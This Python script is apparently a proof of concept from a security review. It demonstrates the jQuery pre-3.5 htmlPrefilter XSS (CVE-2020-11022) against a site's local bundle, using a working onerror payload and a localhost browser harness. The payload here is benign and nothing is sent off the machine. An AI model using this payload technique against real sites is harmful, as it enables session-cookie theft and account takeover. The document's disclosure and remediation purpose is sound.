#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Proof-of-Concept: DOM-based XSS via jQuery < 3.5 htmlPrefilter (CVE-2020-11022 / -11023)
Finding F-01 of the HPA Client-Side Security Review.

AUTHORISED / EDUCATIONAL USE ONLY
---------------------------------
This script demonstrates that the jQuery bundled in the supplied file
`hpa-8529be3.js` (the pre-3.5 `jQuery.htmlPrefilter` routine at line ~36136)
will turn attacker-controlled markup that a PATCHED jQuery treats as inert text
into a live, script-executing element.

It is deliberately constrained for safe demonstration:
  * It NEVER contacts hpacademy.com or any remote service. Everything runs on
    your own machine against the LOCAL files only.
  * The payload is benign: it shows an on-screen "XSS EXECUTED" banner. It does
    NOT exfiltrate anything. (A real attacker would replace it with code that
    steals the session cookie / CSRF token - that impact is described, not done.)

Modes
-----
  (default)   Deterministic, browser-free proof of the root cause. Uses the exact
              vulnerable regex from jQuery <3.5 plus Python's HTML parser (which
              models the browser's <style> CDATA rule) to PROVE that the rewrite
              promotes an inert <img> into an executable top-level element.

  --serve     Additionally builds a local HTML harness that loads the REAL local
              bundle (./hpa-8529be3.js) to obtain the site's own vulnerable `$`,
              fires `$('#sink').html(payload)`, and serves it on 127.0.0.1 so you
              can watch the XSS fire in a browser. Local only.

Usage
-----
  python poc_jquery_xss.py                 # deterministic proof (no browser, no network)
  python poc_jquery_xss.py --serve         # also serve a browser harness on localhost
  python poc_jquery_xss.py --serve --port 8800
"""

import argparse
import html.parser
import json
import re
import sys
import textwrap
import webbrowser

# --------------------------------------------------------------------------- #
#  The attacker-supplied markup.
#
#  Mechanism of CVE-2020-11022:
#   - Attacker input below contains a self-closing  <style />  followed by an
#     <img onerror=...>  that is meant to look like it is *inside* a <style>
#     element (where the browser treats it as inert text / CDATA).
#   - jQuery < 3.5's htmlPrefilter() runs a regex that rewrites every
#     self-closing tag  <tag/>  ->  <tag></tag>.  So  <style />  becomes
#     <style></style>, which inserts an EARLY </style>.  That early close pops
#     the <img> out of the inert <style> context into the live document, and its
#     onerror handler executes.
#   - jQuery >= 3.5 removed this regex rewriting, so the <img> stays inert. Safe.
# --------------------------------------------------------------------------- #
BENIGN_JS = (
    "document.getElementById('result').innerHTML="
    "'&#x2620; XSS EXECUTED - arbitrary JavaScript ran in this page';"
    "var c=document.getElementById('cookie');"
    "if(c){c.textContent=document.cookie||'(no cookies set on localhost)';}"
    "window.__XSS_FIRED=true;console.warn('PoC: attacker JS executed');"
)
PAYLOAD = '<style><style /><img src="x" onerror="%s">' % BENIGN_JS


# --------------------------------------------------------------------------- #
#  jQuery's pre-3.5 htmlPrefilter, reproduced verbatim in Python.
#  Source (jQuery 1.12 - 3.4): rxhtmlTag rewrites self-closing non-void tags.
# --------------------------------------------------------------------------- #
RXHTML_TAG = re.compile(
    r'<(?!area|br|col|embed|hr|img|input|link|meta|param)'
    r'(([a-z][^/\x00>\x20\t\r\n\f]*)[^>]*)/>',
    re.IGNORECASE,
)


def html_prefilter_vulnerable(markup: str) -> str:
    """jQuery < 3.5 behaviour: rewrite <tag/> -> <tag></tag>."""
    return RXHTML_TAG.sub(r'<\1></\2>', markup)


def html_prefilter_patched(markup: str) -> str:
    """jQuery >= 3.5 behaviour: return markup unchanged (no rewriting)."""
    return markup


# --------------------------------------------------------------------------- #
#  Browser-accurate executability check.
#  Python's HTMLParser puts <style>/<script> content into CDATA mode exactly
#  like a browser, so an <img> living inside <style> text is delivered as data
#  (inert) and never as a start tag (executable). We exploit that to PROVE the
#  difference deterministically, without a browser.
# --------------------------------------------------------------------------- #
class ExecDetector(html.parser.HTMLParser):
    VOID = {"area", "br", "col", "embed", "hr", "img", "input", "link",
            "meta", "param", "source", "track", "wbr"}

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.stack = []
        self.executable = []  # list of (tag, handler_attrs, parent_path)

    def _record_if_executable(self, tag, attrs):
        handlers = [k for k, _ in attrs if k.lower().startswith("on")]
        if handlers or tag == "script":
            self.executable.append((tag, handlers, list(self.stack)))

    def handle_starttag(self, tag, attrs):
        self._record_if_executable(tag, attrs)
        if tag not in self.VOID:
            self.stack.append(tag)

    def handle_startendtag(self, tag, attrs):
        self._record_if_executable(tag, attrs)

    def handle_endtag(self, tag):
        if tag in self.stack:
            while self.stack and self.stack.pop() != tag:
                pass


def analyse(markup: str):
    d = ExecDetector()
    d.feed(markup)
    d.close()
    return d.executable


# --------------------------------------------------------------------------- #
#  Deterministic proof
# --------------------------------------------------------------------------- #
def banner():
    print("=" * 78)
    print(" PoC - jQuery <3.5 DOM-XSS (CVE-2020-11022/11023)  |  Finding F-01")
    print(" Target: LOCAL bundle hpa-8529be3.js  (htmlPrefilter @ ~line 36136)")
    print(" Authorised / educational use only - runs locally, no live traffic")
    print("=" * 78)


def show(label, markup):
    print(f"\n{label}")
    print("  " + markup)
    execs = analyse(markup)
    if execs:
        for tag, handlers, parents in execs:
            where = "/".join(parents) if parents else "(document root - ACTIVE)"
            print(f"  -> EXECUTABLE <{tag}> via {handlers}  | parsed location: {where}")
    else:
        print("  -> no executable element reachable (markup is inert)")
    return execs


def demonstrate():
    banner()
    print("\nThe application is assumed to pass attacker-influenced markup to a")
    print("jQuery DOM method such as $(el).html(input) / $(input). The same input")
    print("is processed two ways below: by the VULNERABLE bundled jQuery, and by a")
    print("PATCHED jQuery (>=3.5).\n")
    print("-" * 78)
    print("ATTACKER INPUT (identical in both cases):")
    print("  " + PAYLOAD)
    print("-" * 78)

    vuln_out = html_prefilter_vulnerable(PAYLOAD)
    patched_out = html_prefilter_patched(PAYLOAD)

    v_exec = show("[VULNERABLE jQuery <3.5]  after htmlPrefilter rewrite:", vuln_out)
    p_exec = show("[PATCHED   jQuery >=3.5]  after htmlPrefilter (unchanged):", patched_out)

    print("\n" + "=" * 78)
    print(" VERDICT")
    print("=" * 78)
    if v_exec and not p_exec:
        print(" CONFIRMED VULNERABLE.")
        print(" The bundled jQuery's regex rewrote `<style />` into `<style></style>`,")
        print(" inserting an early </style> that frees the <img onerror=...> into the")
        print(" live DOM. When inserted via .html(), the browser fires onerror and runs")
        print(" the attacker's JavaScript. A patched jQuery leaves the <img> inert.")
        print("\n IMPACT on the in-scope pages (login.html / admin.html): script runs in")
        print(" an authenticated user's / admin's browser -> theft of session cookie and")
        print(" SilverStripe SecurityID, silent form submission, CMS account takeover.")
        print("\n FIX: upgrade jQuery to >= 3.5.0 (and jQuery UI >= 1.13). See report F-01.")
        rc = 0
    else:
        print(" Inconclusive in this environment.")
        rc = 1
    print("\n Run with --serve to watch this execute in a real browser (localhost only).")
    return rc


# --------------------------------------------------------------------------- #
#  Optional local browser harness (uses the REAL local bundle)
# --------------------------------------------------------------------------- #
HARNESS_NAME = "poc_xss_harness.html"


def build_harness(payload: str) -> str:
    payload_js = json.dumps(payload)  # safe JS string literal
    return textwrap.dedent(f"""\
        <!doctype html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <title>PoC - jQuery DOM-XSS (F-01) - LOCAL DEMO</title>
          <style>
            body{{font-family:Segoe UI,Arial,sans-serif;max-width:820px;margin:40px auto;color:#1b2631}}
            h1{{color:#0f2942}} code,pre{{background:#f3f4f6;padding:2px 4px;border-radius:3px}}
            #result:empty::before{{content:"(waiting - if this stays empty, the payload was neutralised = patched)";color:#888}}
            #result{{font-size:20px;font-weight:bold;color:#c0392b;margin:18px 0}}
            .box{{border:1px solid #c7d2dd;border-radius:6px;padding:14px 18px;margin:14px 0}}
            .ok{{color:#1e8449}} .warn{{color:#c0392b}}
          </style>
        </head>
        <body>
          <h1>F-01 PoC &mdash; jQuery &lt;3.5 DOM-XSS (CVE-2020-11022)</h1>
          <p>This page loads the <b>real local bundle</b>
             <code>./hpa-8529be3.js</code> to obtain the site's own
             <code>$</code>, then runs
             <code>$('#sink').html(payload)</code> with the payload below.
             Everything is local; nothing is sent anywhere.</p>
          <div class="box"><b>Payload:</b><br><pre>{html_escape(payload)}</pre></div>
          <div id="result"></div>
          <div class="box">Status: <span id="status">loading bundle&hellip;</span></div>
          <div class="box"><b>document.cookie seen by injected JS (local only):</b>
             <div id="cookie"><i>not read yet</i></div></div>
          <div id="sink" style="display:none"></div>

          <script src="./hpa-8529be3.js"></script>
          <script>
            (function () {{
              var status = document.getElementById('status');
              function run() {{
                if (!window.jQuery) {{
                  status.innerHTML = '<span class="warn">window.$ not exposed by the '
                    + 'bundle in this minimal page (the webpack bundle may need the full '
                    + 'page context). The deterministic CLI proof still confirms the flaw.'
                    + '</span>';
                  return;
                }}
                status.innerHTML = 'bundle loaded; jQuery present. Injecting payload via .html() &hellip;';
                try {{
                  window.jQuery('#sink').html({payload_js});
                  setTimeout(function () {{
                    if (window.__XSS_FIRED) {{
                      status.innerHTML = '<span class="warn">VULNERABLE &mdash; the bundled '
                        + 'jQuery executed attacker JavaScript.</span>';
                    }} else {{
                      status.innerHTML = '<span class="ok">payload did not execute &mdash; '
                        + 'this jQuery appears patched.</span>';
                    }}
                  }}, 400);
                }} catch (e) {{
                  status.textContent = 'error while injecting: ' + e;
                }}
              }}
              if (document.readyState === 'complete') run();
              else window.addEventListener('load', run);
            }})();
          </script>
        </body>
        </html>
        """)


def html_escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))


def serve(port: int, payload: str):
    import http.server
    import os
    import socketserver

    here = os.path.dirname(os.path.abspath(__file__))
    bundle = os.path.join(here, "hpa-8529be3.js")
    if not os.path.exists(bundle):
        print(f"[!] Local bundle not found next to this script: {bundle}")
        print("    The browser harness needs ./hpa-8529be3.js. Aborting --serve.")
        return 1

    harness_path = os.path.join(here, HARNESS_NAME)
    with open(harness_path, "w", encoding="utf-8") as fh:
        fh.write(build_harness(payload))
    print(f"[+] Wrote harness: {harness_path}")

    os.chdir(here)
    # Bind to loopback ONLY - never expose this PoC on the network.
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("127.0.0.1", port), handler) as httpd:
        url = f"http://127.0.0.1:{port}/{HARNESS_NAME}"
        print(f"[+] Serving on {url}  (loopback only - Ctrl+C to stop)")
        try:
            webbrowser.open(url)
        except Exception:
            pass
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[+] Stopped.")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Local PoC for jQuery <3.5 DOM-XSS (Finding F-01). Local use only.")
    ap.add_argument("--serve", action="store_true",
                    help="also build & serve a browser harness on 127.0.0.1 (local only)")
    ap.add_argument("--port", type=int, default=8765, help="port for --serve (default 8765)")
    args = ap.parse_args(argv)

    rc = demonstrate()
    if args.serve:
        print("\n" + "-" * 78)
        rc = serve(args.port, PAYLOAD) or rc
    return rc


if __name__ == "__main__":
    sys.exit(main())
